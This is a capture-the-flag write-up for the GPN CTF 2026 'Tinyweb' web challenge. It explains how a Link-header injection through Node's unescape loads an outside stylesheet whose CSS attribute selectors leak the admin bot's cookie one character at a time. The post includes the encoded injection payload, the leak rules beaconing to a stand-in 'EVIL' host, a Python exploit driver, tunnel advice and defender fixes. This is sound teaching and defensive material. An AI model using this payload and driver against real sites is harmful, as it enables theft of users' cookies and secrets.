---
title: "GPN CTF 2026 — Tinyweb: Link Header CSS Injection + Attribute Selector Exfil"
slug: "gpn-ctf-2026-tinyweb"
description: "GPN CTF 2026 Web: 481 bytes of Node, a Link: rel=preload injection point, body[onload^=...] CSS attribute selectors leak the cookie character-by-character. 25 minutes to flag."
date: 2026-06-07T19:15:00Z
lastmod: 2026-06-07T19:15:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
tags:
  - "gpn ctf 2026"
  - "tinyweb"
  - "css injection"
  - "attribute selector exfil"
  - "link header injection"
  - "xsleak"
  - "rel=stylesheet"
  - "node.js http"
  - "cookie exfiltration"
  - "code golf"
series: ["GPN CTF 2026"]
keywords:
  - "gpn ctf tinyweb writeup"
  - "css attribute selector cookie exfil"
  - "link rel=stylesheet injection"
  - "node unescape header injection"
  - "xsleak ctf"
  - "body onload selector leak"
  - "csp bypass external stylesheet"
toc: true
cover:
  image: "/images/articles/gpn-ctf-2026-tinyweb.png"
  alt: "GPN CTF 2026 Tinyweb writeup — Link header CSS injection plus body[onload^=...] attribute selectors leak the cookie character-by-character"
---

{{< ctf-meta platform="GPN CTF 2026 (kitctf)" difficulty="Medium" os="Web — Node http, Link header injection, CSS attribute-selector exfil" skills="recognising unescape as a percent-decoder that mangles header values, splitting on Link header's comma+semicolon structural separators, injecting a second link entry with rel=stylesheet, hosting the CSS on a serveo-style tunnel that doesn't show an interstitial, iterating body[onload^=prefix] one character at a time" >}}

**Tinyweb** is GPN CTF 2026's pure-web challenge — 481 bytes of one-line Node `http` server with two reflection points and one admin bot that visits attacker-supplied URLs with the flag in a cookie. The intended path turns out to be an `XS-Leaks`-style CSS attribute-selector exfiltration: inject `rel=stylesheet` into the `Link` header via `unescape` percent-decoding, host CSS that uses `body[onload^="prefix"]` selectors to fire `background: url(...)` requests, iterate one character at a time. ~45 iterations of ~35 seconds each recover:

```
GPNCTF{codE_gOLF_i5_fUN__firEF0x_FEA7uRe5_7Oo}
```

This is the standalone deep-dive on `web/tinyweb` from the [GPN CTF 2026 master writeup](/ctf-writeups/gpn-ctf-2026-writeup/). Full source at [`web/tinyweb`](https://github.com/Abdelkad3r/gpn-ctf-2026/tree/master/web/tinyweb).

## The source

`index.js` — the server the bot visits:

```js
require('http').createServer((a,b)=>
  b.writeHead(200,{
    'content-type':'text/html',
    link:`<${unescape(a.url)}>;rel=preload;as=fetch`
  })
  + b.end(`<body onload=fetch('${a.headers.cookie}')>`)
).listen(8080)
```

`admin.js` — the headless-Chromium bot, abridged:

```js
const cookieSetter = await browser.newPage()
await cookieSetter.goto("http://localhost:8080", {waitUntil:'domcontentloaded'})
await cookieSetter.evaluate(flag => document.cookie = flag, process.env.FLAG)
await cookieSetter.close()

const page = await browser.newPage()
await page.goto(targetUrl, {waitUntil:'domcontentloaded'})   // targetUrl must
await sleep(30000)                                            // start with
await browser.close()                                          // http://localhost:8080
```

`process.env.FLAG` is set to `flag=GPNCTF{...}`, so the cookie ends up as a normal `Cookie: flag=GPNCTF{...}` request header.

## Sinks

| Sink                              | Source                  | Encoding           |
|-----------------------------------|-------------------------|--------------------|
| `Link: <SINK>;rel=preload;as=fetch`| `unescape(req.url)`     | header value       |
| `<body onload=fetch('SINK')>`     | `req.headers.cookie`    | JS string literal  |

We control the URL the bot visits (subject to `startsWith('http://localhost:8080')`), so we control `req.url` → the `Link` header. We **do not** control the cookie value — that *is* the flag.

## Why the obvious tricks don't work

- **CRLF injection** (`%0d%0a`). Node's `http` module rejects header values containing `\r`, `\n`, or anything `< 0x20` except `\t`. Sending such bytes makes `writeHead` throw and the connection 502s.
- **Cookie XSS via the body.** The body reflects `'${cookie}'` into a JS string. The flag (`GPNCTF{...}`) is alphanumerics + `_{}=` only — no `'`, `\`, or newline. The cookie can't break out of the string on its own. There's no way to set a second cookie either (no `Set-Cookie` from the server; the cookieSetter loads a body with `req.headers.cookie === undefined`).
- **Direct exfil via `fetch`.** `fetch('${cookie}')` resolves the cookie as a *relative* URL — always stays on `localhost:8080`. The flag doesn't start with `//` or `http://`, so no cross-origin request.

## The Link-header CSS injection

`Link` headers can carry multiple comma-separated entries:

```
Link: <a>;rel=preload, <b>;rel=stylesheet, <c>;rel=preload
```

The server's template is `<${unescape(a.url)}>;rel=preload;as=fetch`. If our URL decodes to `?>,<https://EVIL/x.css>;rel=stylesheet,</x`, the final header is:

```
Link: </?>,<https://EVIL/x.css>;rel=stylesheet,</x>;rel=preload;as=fetch
```

Three valid entries:

1. `</?>` — useless preload of `/?`.
2. `<https://EVIL/x.css>;rel=stylesheet` — **fetches our CSS and applies it as a stylesheet**.
3. `</x>;rel=preload;as=fetch` — leftover boilerplate, harmless.

Percent-encoded payload path:

```
?%3E%2C%3Chttps%3A%2F%2FEVIL%2Fx.css%3E%3Brel%3Dstylesheet%2C%3C%2Fx
```

## CSS attribute-selector exfiltration

The bot's body looks like:

```html
<body onload=fetch('flag=GPNCTF{codE_gOLF_…')>
```

CSS `[attr^="prefix"]` matches a starting substring of an attribute. With one rule per candidate next character, only the matching rule fires — and its `background-image` URL beacons our server:

```css
body[onload^="fetch('flag=GPNCTF{a"] { background: url("https://EVIL/leak?c=a") }
body[onload^="fetch('flag=GPNCTF{b"] { background: url("https://EVIL/leak?c=b") }
…
body[onload^="fetch('flag=GPNCTF{}"] { background: url("https://EVIL/leak?c=%7D") }
```

The bot's browser evaluates the selectors, makes one outbound request, and our server logs which character matched. Update the known prefix and repeat until the leaked character is `}`.

## Exploit driver

```python
INSTANCE = "https://<the-challenge-instance>.gpn24.ctf.kitctf.de"
CSS_URL  = "https://<sub>.serveousercontent.com/style.css"

def submit_bot():
    inj = "?" + urllib.parse.quote(f">,<{CSS_URL}>;rel=stylesheet,</x", safe="")
    target = f"http://localhost:8080/{inj}"
    url = f"{INSTANCE}/bot/run?url={urllib.parse.quote(target, safe='')}"
    return urllib.request.urlopen(url, timeout=60).read().decode().strip()

flag = ""
for _ in range(80):
    set_prefix(f"fetch('flag=GPNCTF{{{flag}")
    clear_log()
    submit_bot()
    deadline = time.time() + 60
    leaked = None
    while time.time() < deadline:
        leaked = last_leak()
        if leaked is not None: break
        time.sleep(2)
    if leaked is None: break
    flag += leaked
    if leaked == "}": break
```

The CSS server regenerates `style.css` per request with the current prefix:

```python
def make_css(prefix, base_url):
    rules = []
    for c in CHARS:
        full = (prefix + c).replace("\\","\\\\").replace('"','\\"')
        rules.append(
            f'body[onload^="{full}"] '
            f'{{ background: url("{base_url}/leak?c={urllib.parse.quote(c,safe="")}"); }}'
        )
    return "\n".join(rules)
```

Each iteration ≈ 35 s (30 s `await sleep(30000)` in the bot + LLL of network round-trips). ~45 iterations recover the flag in ~25 minutes.

## Operational note — picking the tunnel

The bot's browser fetches `https://EVIL/x.css` directly only if the host doesn't show an interstitial warning page. Most "free" tunnels (ngrok, localtunnel, cloudflared without a token) put a "are you sure?" page in front of `text/css` responses — the bot times out before pressing through. `serveo.net` via `ssh -R 80:localhost:9000 serveo.net` returns `https://<sub>.serveousercontent.com` and ships the CSS without an interstitial. Tunnel selection is a real operational variable here.

## Defender takeaway

- **`Link: rel=stylesheet` injection is a general CSP bypass on any site that doesn't pin stylesheet sources.** The fix is `style-src 'self'` (or a hash-pinned subset) *and* a strict Link header parser that rejects multi-entry input or refuses any `rel=stylesheet` from user input. Modern browsers fetch Link-preload and Link-stylesheet entries from any origin by default — the trust boundary needs to be enforced by the server.
- **CSS attribute selectors are an XSLeaks primitive.** `[attr^="x"]` paired with `background: url(…)` exfiltrates any DOM attribute's prefix at network rate, with zero JavaScript execution required. Defender mitigation: `style-src 'self'` is the only general-purpose fix. Site-specific defences include not rendering sensitive values into DOM attributes — store them in textContent or out-of-DOM JS variables.
- **`unescape` is a deprecated percent-decoder that nobody should call.** It decodes `%XX` and `%uXXXX` happily, but its behaviour on edge cases differs across engines. Any user-controlled string fed through `unescape` should be assumed to produce attacker-chosen output.
- **Anywhere a user-controlled string lands inside a structured header**, assume the attacker can split on structural separators. `Link`, `Content-Security-Policy`, `Set-Cookie`, `Set-Cookie`'s `=` and `;`, `Accept-Language`'s `,` and `;`, `Cookie`'s `=` and `;` — all parsed structurally.

## Frequently asked questions

### What's the bug in tinyweb?

The Node server reflects `unescape(req.url)` into a `Link: <URL>;rel=preload;as=fetch` header. `unescape` decodes `%XX` to raw bytes — including `>`, `,`, `<`, `;`. Crafting a URL like `?>,<https://EVIL/x.css>;rel=stylesheet,</x` injects a second `Link` entry with `rel=stylesheet` pointing at attacker-controlled CSS. The bot's browser fetches and applies it.

### Why doesn't CSP block the stylesheet?

The challenge doesn't set `style-src`. The default browser behaviour for `Link: rel=stylesheet` is to fetch from any origin. Adding `style-src 'self'` would block external CSS entirely; a hash-pinned subset would allow specific inline styles only.

### How does the attribute-selector exfil work?

CSS `[attr^="prefix"]` matches when the named attribute starts with `prefix`. Pair with `background: url(...)` and only the matching rule fires a network request. One rule per candidate character → exactly one outbound request per iteration, identifying the next character of the cookie. Iterate until you hit `}`.

### Why is the iteration rate-limited to ~35 seconds?

The admin bot's `admin.js` includes `await sleep(30000)` after navigating the bot to the attacker URL. We have to wait the full 30 seconds for the stylesheet to load and the selector to fire before the browser closes. Plus network round-trips — ~35 seconds per iteration, ~45 iterations for the full flag.

### Why does tunnel selection matter?

Most free tunnels (ngrok, localtunnel, cloudflared without a token) display an interstitial warning page for `text/css` responses. The bot's browser doesn't click through, so the stylesheet never loads. `serveo.net` (`ssh -R 80:localhost:9000 serveo.net`) returns CSS without an interstitial, which is the operational requirement.

### How would you fix this server?

Three orthogonal fixes: (1) `style-src 'self'` CSP to block external stylesheets; (2) Strict Link header parser that rejects multi-entry or attacker-controlled `rel=stylesheet`; (3) Don't reflect `unescape(req.url)` into a header — use `encodeURIComponent` or just don't reflect URLs. Any one of the three breaks the exploit.

### Where can I find the solver?

Full source at [`web/tinyweb`](https://github.com/Abdelkad3r/gpn-ctf-2026/tree/master/web/tinyweb) including the CSS server and driver. Master writeup at [/ctf-writeups/gpn-ctf-2026-writeup/](/ctf-writeups/gpn-ctf-2026-writeup/).

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What's the bug in tinyweb?","acceptedAnswer": {"@type": "Answer","text": "The Node server reflects unescape(req.url) into a Link: <URL>;rel=preload;as=fetch header. unescape decodes %XX to raw bytes including >, comma, <, semicolon. Crafting a URL that injects a second Link entry with rel=stylesheet pointing at attacker-controlled CSS makes the bot's browser fetch and apply it."}},
    {"@type": "Question","name": "Why doesn't CSP block the stylesheet?","acceptedAnswer": {"@type": "Answer","text": "The challenge doesn't set style-src. Default browser behaviour for Link: rel=stylesheet fetches from any origin. style-src 'self' would block external CSS entirely; a hash-pinned subset would allow specific inline styles only."}},
    {"@type": "Question","name": "How does the attribute-selector exfil work?","acceptedAnswer": {"@type": "Answer","text": "CSS [attr^=prefix] matches when the named attribute starts with prefix. Pair with background: url(...) and only the matching rule fires a network request. One rule per candidate character → one outbound request per iteration identifying the next character. Iterate until }."}},
    {"@type": "Question","name": "Why is the iteration rate-limited to ~35 seconds?","acceptedAnswer": {"@type": "Answer","text": "The admin bot's admin.js includes await sleep(30000) after navigating to the attacker URL. We must wait 30 seconds for the stylesheet to load and the selector to fire before the browser closes. Plus network round-trips — ~35 seconds per iteration, ~45 iterations for the full flag."}},
    {"@type": "Question","name": "Why does tunnel selection matter?","acceptedAnswer": {"@type": "Answer","text": "Most free tunnels show an interstitial warning page for text/css responses; the bot's browser doesn't click through and the stylesheet never loads. serveo.net (ssh -R 80:localhost:9000 serveo.net) returns CSS without an interstitial — operational requirement."}},
    {"@type": "Question","name": "How would you fix this server?","acceptedAnswer": {"@type": "Answer","text": "Three orthogonal fixes: style-src 'self' CSP to block external stylesheets; strict Link header parser rejecting multi-entry or attacker-controlled rel=stylesheet; don't reflect unescape(req.url) into a header — use encodeURIComponent or don't reflect URLs at all."}},
    {"@type": "Question","name": "Where can I find the solver code?","acceptedAnswer": {"@type": "Answer","text": "Full source at web/tinyweb in github.com/Abdelkad3r/gpn-ctf-2026 including the CSS server and driver. Master writeup at cybersecurityelite.com/ctf-writeups/gpn-ctf-2026-writeup/."}}
  ]
}
</script>
